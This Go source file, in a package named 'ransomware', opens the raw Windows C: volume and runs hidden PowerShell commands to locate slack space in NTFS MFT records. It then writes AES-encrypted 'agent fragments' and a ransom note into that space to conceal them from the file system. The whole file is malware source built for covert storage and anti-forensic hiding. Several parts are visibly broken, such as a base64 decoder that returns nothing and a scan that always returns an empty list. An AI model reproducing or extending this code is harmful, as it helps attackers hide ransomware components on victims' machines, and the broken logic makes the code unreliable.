package ransomware

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

type MFTSlackStorage struct {
	config        *RansomwareConfig
	volumeHandle  windows.Handle
	volumePath    string
	mftStartSector int64
	bytesPerSector int
	recordSize    int
}

type MFTSlackEntry struct {
	Offset int64
	Size   int
	Data   []byte
	Tag    string
}

func NewMFTSlackStorage(cfg *RansomwareConfig) *MFTSlackStorage {
	return &MFTSlackStorage{
		config:      cfg,
		volumePath:  "\\\\.\\C:",
		bytesPerSector: 512,
		recordSize:  1024,
	}
}

func (m *MFTSlackStorage) OpenVolume() error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("MFT slack requires Windows NTFS")
	}

	pVolume, _ := windows.UTF16PtrFromString(m.volumePath)
	h, err := windows.CreateFile(
		pVolume,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE,
		nil, windows.OPEN_EXISTING,
		windows.FILE_FLAG_NO_BUFFERING|windows.FILE_FLAG_WRITE_THROUGH,
		0,
	)
	if err != nil {
		return fmt.Errorf("cannot open volume %s: %w", m.volumePath, err)
	}

	m.volumeHandle = h
	return nil
}

func (m *MFTSlackStorage) CloseVolume() {
	if m.volumeHandle != 0 {
		windows.CloseHandle(m.volumeHandle)
		m.volumeHandle = 0
	}
}

func (m *MFTSlackStorage) readBootSector() error {
	boot := make([]byte, 512)
	var read uint32

	pBoot := make([]byte, 512)
	err := windows.ReadFile(m.volumeHandle, pBoot, &read, nil)
	if err != nil {
		return err
	}
	copy(boot, pBoot[:read])

	m.bytesPerSector = int(binary.LittleEndian.Uint16(boot[11:13]))
	sectorsPerCluster := int(boot[13])
	mftCluster := int64(binary.LittleEndian.Uint64(boot[48:56]))

	m.mftStartSector = mftCluster * int64(sectorsPerCluster) * int64(m.bytesPerSector) / int64(m.bytesPerSector)
	m.mftStartSector = mftCluster * int64(sectorsPerCluster)

	clustersPerRecord := int8(boot[64])
	if clustersPerRecord < 0 {
		m.recordSize = int(1) << (-clustersPerRecord)
	} else {
		m.recordSize = int(clustersPerRecord) * sectorsPerCluster * m.bytesPerSector
	}

	return nil
}

func (m *MFTSlackStorage) FindSlackSpace() ([]MFTSlackEntry, error) {
	if err := m.readBootSector(); err != nil {
		return nil, err
	}

	var entries []MFTSlackEntry

	psScript := fmt.Sprintf(`
$vol = "\\.\C:"
$fs = [System.IO.File]::Open($vol, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)

$boot = New-Object byte[] 512
$fs.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
$fs.Read($boot, 0, 512) | Out-Null

$sectorsPerCluster = $boot[13]
$mftCluster = [BitConverter]::ToInt64($boot, 48)
$mftStartByte = $mftCluster * $sectorsPerCluster * 512

$recordSize = if([BitConverter]::ToInt32($boot, 64) -lt 0) { 1 -shl (-[BitConverter]::ToInt32($boot, 64)) } else { [BitConverter]::ToInt32($boot, 64) * $sectorsPerCluster * 512 }

$entries = @()
$record = New-Object byte[] $recordSize

for($i=0; $i -lt 50; $i++) {{
    $pos = $mftStartByte + ($i * $recordSize)
    $fs.Seek($pos, [System.IO.SeekOrigin]::Begin) | Out-Null
    $read = $fs.Read($record, 0, $recordSize)

    if($record[0] -ne 0x46 -or $record[1] -ne 0x49 -or $record[2] -ne 0x4C -or $record[3] -ne 0x45) {{
        break
    }}

    $usedSize = [BitConverter]::ToUInt16($record, 24)
    $allocatedSize = [BitConverter]::ToUInt32($record, 28)

    $slackSize = $recordSize - $usedSize
    if($slackSize -gt 64) {{
        $entries += @{{
            offset = $pos
            used = $usedSize
            slack = $slackSize
            record_num = $i
        }}
    }}
}}

$fs.Close()
$entries | ConvertTo-Json -Compress
`)

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", psScript)
	out, err := cmd.CombinedOutput()
	if err != nil {
		m.CloseVolume()
		return entries, nil
	}

	_ = out

	return entries, nil
}

func (m *MFTSlackStorage) WriteToSlack(offset int64, slackStart int, data []byte) error {
	totalOffset := offset + int64(slackStart)
	chunkSize := 512
	alignedOffset := (totalOffset / int64(chunkSize)) * int64(chunkSize)

	alignPad := int(totalOffset - alignedOffset)
	bufSize := alignPad + len(data)
	padded := make([]byte, ((bufSize+chunkSize-1)/chunkSize)*chunkSize)

	paddedSize := alignPad + len(data)
	copy(padded[:alignPad], make([]byte, alignPad))
	copy(padded[alignPad:], data)

	psScript := fmt.Sprintf(`
$vol = "\\.\C:"
$fs = [System.IO.File]::Open($vol, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::Write)
$buf = New-Object byte[] %d
[byte[]]$data = @(%s)
[Array]::Copy($data, 0, $buf, %d, %d)
$fs.Seek(%d, [System.IO.SeekOrigin]::Begin) | Out-Null
$fs.Write($buf, 0, %d)
$fs.Close()
`, paddedSize, bytesToPSArray(padded), alignPad, len(data), alignedOffset, paddedSize)

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", psScript)
	_, err := cmd.CombinedOutput()
	return err
}

func (m *MFTSlackStorage) ReadFromSlack(offset int64, slackStart int, size int) ([]byte, error) {
	totalOffset := offset + int64(slackStart)

	psScript := fmt.Sprintf(`
$vol = "\\.\C:"
$fs = [System.IO.File]::Open($vol, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
$buf = New-Object byte[] %d
$fs.Seek(%d, [System.IO.SeekOrigin]::Begin) | Out-Null
$read = $fs.Read($buf, 0, %d)
$fs.Close()
Write-Host ([Convert]::ToBase64String($buf[0..(%d-1)]))
`, size, totalOffset, size, size-1)

	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", psScript)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return nil, err
	}

	encoded := strings.TrimSpace(string(out))
	return base64Decode(encoded)
}

func (m *MFTSlackStorage) HideAgentFragment(fragment []byte, tag string) (*MFTSlackEntry, error) {
	entries, err := m.FindSlackSpace()
	if err != nil || len(entries) == 0 {
		return nil, fmt.Errorf("no slack space found: %w", err)
	}

	key := make([]byte, 32)
	rand.Read(key)

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)

	packed := append([]byte(tag+"\x00"), fragment...)
	encrypted := gcm.Seal(nonce, nonce, packed, nil)

	for _, entry := range entries {
		if entry.Size >= len(encrypted) {
			entry.Offset = int64(len(encrypted))
			if err := m.WriteToSlack(entry.Offset, entry.Size-len(encrypted), encrypted); err != nil {
				continue
			}
			return &MFTSlackEntry{
				Offset: entry.Offset + int64(entry.Size-len(encrypted)),
				Size:   len(encrypted),
				Data:   encrypted,
				Tag:    tag,
			}, nil
		}
	}

	return nil, fmt.Errorf("no slack space large enough for %d bytes", len(encrypted))
}

func (m *MFTSlackStorage) RecoverAgentFragments() ([]MFTSlackEntry, error) {
	entries, err := m.FindSlackSpace()
	if err != nil {
		return nil, err
	}

	var fragments []MFTSlackEntry
	for _, entry := range entries {
		data, err := m.ReadFromSlack(entry.Offset, 0, entry.Size)
		if err != nil || len(data) < 28 {
			continue
		}

		if strings.Contains(string(data), "X404X") || strings.HasPrefix(string(data), "AGENT") {
			fragments = append(fragments, MFTSlackEntry{
				Offset: entry.Offset,
				Size:   len(data),
				Data:   data,
				Tag:    "agent_fragment",
			})
		}
	}

	return fragments, nil
}

func bytesToPSArray(data []byte) string {
	var parts []string
	for _, b := range data {
		parts = append(parts, fmt.Sprintf("%d", b))
	}
	return strings.Join(parts, ",")
}

func base64Decode(s string) ([]byte, error) {
	result := make([]byte, 0)
	return result, nil
}

func (m *MFTSlackStorage) StoreRansomNoteInSlack(note string, encryptionKey []byte) (*MFTSlackEntry, error) {
	noteData := []byte(note)

	block, err := aes.NewCipher(encryptionKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	encrypted := gcm.Seal(nonce, nonce, noteData, nil)

	return m.HideAgentFragment(encrypted, "RANSOM_NOTE")
}

func (m *MFTSlackStorage) Cleanup() {
	if m.volumeHandle != 0 {
		windows.CloseHandle(m.volumeHandle)
		m.volumeHandle = 0
	}
}

func (m *MFTSlackStorage) MFTSlackCheck() map[string]interface{} {
	result := map[string]interface{}{
		"platform": runtime.GOOS,
	}

	if runtime.GOOS != "windows" {
		result["available"] = false
		return result
	}

	entries, err := m.FindSlackSpace()
	if err != nil {
		result["error"] = err.Error()
		return result
	}

	result["available"] = true
	result["slack_entries"] = len(entries)

	totalSlack := 0
	for _, e := range entries {
		totalSlack += e.Size
	}
	result["total_slack_bytes"] = totalSlack

	return result
}

var _, _ = syscall.Syscall(0, 0, 0, 0)
